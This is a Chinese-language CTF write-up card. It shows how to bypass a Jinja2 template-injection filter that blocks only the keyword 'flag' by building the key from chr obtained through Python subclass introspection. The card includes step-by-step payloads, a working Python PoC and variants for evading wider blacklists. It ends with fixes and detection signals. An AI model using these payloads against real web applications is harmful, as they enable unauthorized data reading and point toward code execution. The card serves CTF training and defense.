---
id: web-python-ssti-jinja2-flag-keyword-chr-subclass-index-bypass
title: Jinja2 SSTI 只过滤 flag 关键词：子类索引取 chr 拼接键名读取 doc['flag']
type: scenario
domain: web
path: web/python/ssti
technique: jinja2-flag-keyword-chr-subclass-index-bypass
aliases:
- 公文套红预览
- doc.get('flag') 被拦
- BuiltinBridge
- subclasses()[117]
- chr 拼接 flag
- Jinja2 黑名单
tags:
- ssti
- jinja2
- python
- waf-bypass
- chr
- subclasses
- ctf
- flask
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V127
  verified_at: '2026-11-06T04:22:43+08:00'
  notes: 已对照原文核对：/backup/app.py.bak 的 doc 字典、doc.get(title) 回显、doc.get(flag) 被拦、BuiltinBridge 索引 117 的 __builtins__[chr]、chr(102/108/97/103) 拼 flag、回显 ISCC{enterprise_red_doc_preview}，均与卡片一致。未验证点：PoC 未本机复跑；原文无组件版本；frontmatter 无 sources/source_url。
---

## 一句话结论

`/preview` 的 `tpl` 参数存在 Jinja2 SSTI；服务端只把 `flag` 关键词加入黑名单，`{{doc.get('title')}}` 可正常回显；从 `''.__class__.__base__.__subclasses__()[117]` 找到 `BuiltinBridge`，取其 `__init__.__globals__['__builtins__']['chr']`，用 `chr(102)+chr(108)+chr(97)+chr(103)` 拼出 `flag` 作为 `doc.get()` 的键，即可绕过过滤读取 flag。

## 原理

- **模板注入上下文**：`/preview` 把用户 `tpl` 作为 Jinja2 模板渲染，模板上下文里存在 `doc` 字典；`{{doc.get('title')}}` 返回标题，证明表达式可执行。
- **黑名单只匹配字面量**：服务端把 `flag` 作为子串拦截，`{{doc.get('flag')}}` 被拒；但 `doc.get(chr(102)+chr(108)+chr(97)+chr(103))` 的模板源码中不含连续 `flag`，运行时才拼出键名。
- **对象图取 chr**：`''.__class__` 是 `str`，`__base__` 是 `object`，`__subclasses__()` 枚举所有已加载子类；`BuiltinBridge` 的 `__init__.__globals__` 中暴露了 `__builtins__` 字典，其中包含 `chr`。索引 `[117]` 是当前环境的固定位置，换环境需重新枚举。
- **等价性**：`chr(102) == "f"`、`chr(108) == "l"`、`chr(97) == "a"`、`chr(103) == "g"`，拼接结果就是 `"flag"`，`doc.get("flag")` 返回真实 flag。

## 触发条件

- 用户输入被当作 Jinja2 模板源码渲染（`render_template_string`、`Template(...).render`、低代码模板字段）。
- 存在关键词黑名单（如 `flag`），但没有沙箱/AST 白名单。
- 模板上下文中有敏感字典/对象；Python 对象图可达 `__subclasses__`/`__globals__`/`__builtins__`。
- 能读取响应回显。

## 利用步骤

1. 访问首页/源码备份（如 `/backup/app.py.bak`），确认 `doc` 字典结构与 `flag` 字段。
2. `POST /preview`，`tpl={{doc.get('title')}}` 验证模板执行；`tpl={{doc.get('flag')}}` 确认被黑名单拦截。
3. `tpl={{''.__class__.__base__.__subclasses__()}}` 枚举子类，找到 `BuiltinBridge` 的索引（本例 117）。
4. `tpl={{''.__class__.__base__.__subclasses__()[117].__init__.__globals__}}` 确认 `__builtins__` 中有 `chr`。
5. 构造 `chain = "''.__class__.__base__.__subclasses__()[117].__init__.__globals__['__builtins__']['chr']"`，拼 `doc.get(chain(102)+chain(108)+chain(97)+chain(103))`。
6. 从 `<pre>` 回显中提取 flag；若索引漂移，先枚举再替换。

## PoC

```python
import html, re, requests

url = "http://target:49104/preview"
chain = "''.__class__.__base__.__subclasses__()[117].__init__.__globals__['__builtins__']['chr']"
payload = "{{doc.get(%s(102)+%s(108)+%s(97)+%s(103))}}" % (chain, chain, chain, chain)

resp = requests.post(url, data={"tpl": payload}, timeout=10)
match = re.search(r"<pre>(.*?)</pre>", resp.text, re.S)
print(html.unescape(match.group(1)).strip())
```

## 变体与关联

- **索引变体**：`BuiltinBridge` 索引随 Python 版本/加载模块变化；可先打印 `__subclasses__()` 再定位，或改用 `__globals__` 遍历所有子类找 `chr`/`__import__`。
- **拼接变体**：`chr(95)` 拼下划线、`getattr`、`request.args` 传参、`\x66\x6c\x61\x67`、`join`/`format`、字典键 `['fl'+'ag']`。
- **黑名单变体**：可能同时拦 `__`、`class`、`subclasses`、`globals`、`builtins`、`chr`；需换 `attr` 过滤器、`|attr(...)`、`getattr` 或十六进制转义。
- **关联卡片**：[[web-python-ssti-jinja2-subclasses-index-rce]]（子类索引 RCE）、[[web-python-ssti-getattr-chr-blacklist-bypass]]（getattr+chr 黑名单绕过）、[[web-python-ssti-jinja2-waf-bypass-hex-attr-args]]（Jinja2 WAF 绕过）。
- **边界**：若模板运行在真正沙箱（禁属性/调用/子类）或黑名单覆盖 `chr`/`getattr` 且无其他拼接原语，本链不成立。

## 检测与防御

- **CTF 验证**：先确认 `{{doc.get('title')}}` 回显、`{{doc.get('flag')}}` 被拦，再确认 `chr` 链能拼出键名并读到 flag。
- **修复**：不要用用户输入作模板源码；使用 `render_template` + 固定模板文件；必须动态渲染时用沙箱/白名单（禁属性访问、调用、导入、推导式）；模板上下文最小化，不暴露含敏感字段的字典。
- **检测信号**：请求中出现 `{{`、`__class__`、`__subclasses__`、`__globals__`、`__builtins__`、`chr(`、`getattr(`；大量 URL 编码/拼接表达式；模板渲染耗时异常。
